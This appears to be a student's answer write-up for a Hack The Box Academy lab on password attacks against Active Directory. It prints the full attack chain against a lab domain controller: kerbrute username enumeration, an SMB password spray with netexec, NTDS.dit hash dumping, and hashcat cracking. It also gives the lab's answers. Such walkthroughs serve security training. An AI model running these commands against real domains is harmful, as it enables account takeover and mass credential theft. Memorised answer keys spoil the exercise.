# Section 14: Attacking Active Directory and NTDS.dit

Module: 10. Password Attacks

---

## Questions & Answers

### 1. What is the name of the file stored on a domain controller that contains the password hashes of all domain accounts? (Format: ****.***)

**Answer:** `NTDS.dit`

---

### 2. Submit the NT hash associated with the Administrator user from the example output in the section reading.


**Answer:** `64f12cddaa88057e06a81b54e73b949b`

---

### 3. On an engagement you have gone on several social media sites and found the Inlanefreight employee names: John Marston IT Director, Carol Johnson Financial Controller and Jennifer Stapleton Logistics Manager. You decide to use these names to conduct your password attacks against the target domain controller. Submit John Marston's credentials as the answer. (Format: username:password, Case-Sensitive)

Context:
```bash
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-rylfq7ka1d]─[~]
└──╼ [★]$ vim usernames.txt
# john marston
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@htb-rylfq7ka1d]─[~]
└──╼ [★]$ cat names_expanded.txt 
john 
johnmarston 
john. 
marston 
johnmars 
johnm 
j.marston 
jmarston 
mjohn
m.john 
marstonj 
marston 
marston.j 
marston.john 
jm
```
- Brute force the correct credentials
```bash
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@pwnbox7]─[~]
└──╼ [★]$ ./kerbrute_linux_amd64 userenum --dc 10.129.202.85 --domain ILF.local names_expanded.txt

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/04/26 - Ronnie Flathers @ropnop

2026/08/04 21:06:33 >  Using KDC(s):
2026/08/04 21:06:33 >  	10.129.202.85:88

2026/08/04 21:06:33 >  [+] VALID USERNAME:	 jmarston@ILF.local
2026/08/04 21:06:34 >  Done! Tested 15 usernames (1 valid) in 0.345 seconds
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@pwnbox7]─[~]
└──╼ [★]$ netexec smb 10.129.202.85 -u jmarston -p /usr/share/wordlists/fasttrack.txt
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating missing folder logs/sam
[*] Creating missing folder logs/lsa
[*] Creating missing folder logs/ntds
[*] Creating missing folder logs/dpapi
[*] Creating default workspace
[*] Initializing SMB protocol database
[*] Initializing MSSQL protocol database
[*] Initializing VNC protocol database
[*] Initializing LDAP protocol database
[*] Initializing RDP protocol database
[*] Initializing FTP protocol database
[*] Initializing SSH protocol database
[*] Initializing WMI protocol database
[*] Initializing NFS protocol database
[*] Initializing WINRM protocol database
[*] Copying default configuration file
SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Spring2017 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Spring2016 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Spring2015 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Spring2014 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Spring2013 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:spring2017 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:spring2016 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:spring2015 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:spring2014 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:spring2013 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Summer2017 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Summer2016 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Summer2015 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Summer2014 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Summer2013 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:summer2017 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:summer2016 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:summer2015 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:summer2014 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:summer2013 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Autumn2017 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Autumn2016 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Autumn2015 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Autumn2014 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Autumn2013 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:autumn2017 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:autumn2016 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:autumn2015 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:autumn2014 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:autumn2013 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:winter2017 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:winter2016 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:winter2015 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:winter2014 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:winter2013 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@55w0rd STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@55w0rd! STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:sqlsqlsqlsql STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:SQLSQLSQLSQL STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Welcome123 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Welcome1234 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Welcome1212 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:PassSql12 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:network STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:networking STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:networks STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:test STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:testtest STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:testing STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:testing123 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:testsql STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:test-sql3 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:sqlsqlsqlsqlsql STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:bankbank STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:default STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:test STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:testing STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:password2 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston: STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:password STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Password1 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Password1! STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@ssw0rd STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:password12 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Password12 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:security STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:security1 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:security3 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:secuirty3 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:complex1 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:complex2 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:complex3 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:sqlserver STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:sql STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:sqlsql STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:password1 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:password123 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:complexpassword STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:database STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:server STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:changeme STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:change STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:sqlserver2000 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:sqlserver2005 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Sqlserver STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:SqlServer STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Password1 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:Password2 STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@ssw0rd STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@ssw0rd! STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [-] ILF.local\jmarston:P@55w0rd! STATUS_LOGON_FAILURE 
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
```

**Answer:** `jmarston:P@ssword!`

---

### 4. Capture the NTDS.dit file and dump the hashes. Use the techniques taught in this section to crack Jennifer Stapleton's password. Submit her clear-text password as the answer. (Format: Case-Sensitive)

Context:
- Got NLTM hash:
```bash
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@pwnbox7]─[~]
└──╼ [★]$ netexec smb 10.129.202.85 -u jmarston -p P@ssword! -M ntdsutil
SMB         10.129.202.85   445    ILF-DC01         [*] Windows 10 / Server 2019 Build 17763 x64 (name:ILF-DC01) (domain:ILF.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.202.85   445    ILF-DC01         [+] ILF.local\jmarston:P@ssword! (Pwn3d!)
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] Dumping ntds with ntdsutil.exe to C:\Windows\Temp\178589226
NTDSUTIL    10.129.202.85   445    ILF-DC01         Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] NTDS.dit dumped to C:\Windows\Temp\178589226
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] Copying NTDS dump to /tmp/tmpo2gk0z9x
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] NTDS dump copied to /tmp/tmpo2gk0z9x
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Deleted C:\Windows\Temp\178589226 remote dump directory
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Dumping the NTDS, this could take a while so go grab a redbull...
NTDSUTIL    10.129.202.85   445    ILF-DC01         Administrator:500:aad3b435b51404eeaad3b435b51404ee:7796ee39fd3a9c3a1844556115ae1a54:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF-DC01$:1000:aad3b435b51404eeaad3b435b51404ee:68c9e34aed0c0d7940175087e9dbacdb:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         krbtgt:502:aad3b435b51404eeaad3b435b51404ee:cfa046b90861561034285ea9c3b4af2f:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\jmarston:1103:aad3b435b51404eeaad3b435b51404ee:2b391dfc6690cc38547d74b8bd8a5b49:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\cjohnson:1104:aad3b435b51404eeaad3b435b51404ee:5fd4475a10d66f33b05e7c2f72712f93:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\jstapleton:1108:aad3b435b51404eeaad3b435b51404ee:92fd67fd2f49d0e83744aa82363f021b:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         ILF.local\gwaffle:1109:aad3b435b51404eeaad3b435b51404ee:07a0bf5de73a24cb8ca079c1dcd24c13:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         LAPTOP01$:1111:aad3b435b51404eeaad3b435b51404ee:be2abbcd5d72030f26740fb531f1d7c4:::
NTDSUTIL    10.129.202.85   445    ILF-DC01         [+] Dumped 9 NTDS hashes to /home/htb-ac-2162140/.nxc/logs/ntds/ILF-DC01_10.129.202.85_2026-08-04_211102.ntds of which 7 were added to the database
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] To extract only enabled accounts from the output file, run the following command: 
NTDSUTIL    10.129.202.85   445    ILF-DC01         [*] grep -iv disabled /home/htb-ac-2162140/.nxc/logs/ntds/ILF-DC01_10.129.202.85_2026-08-04_211102.ntds | cut -d ':' -f1
```
- Crack `jstapleton` hash:
```bash
┌─[eu-academy-2]─[10.10.14.98]─[htb-ac-2162140@pwnbox7]─[~]
└──╼ [★]$ hashcat -a 0 -m 1000 92fd67fd2f49d0e83744aa82363f021b /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting
# ...
```

**Answer:** `Winter2008`

---

[Back to Module Index](./README.md)
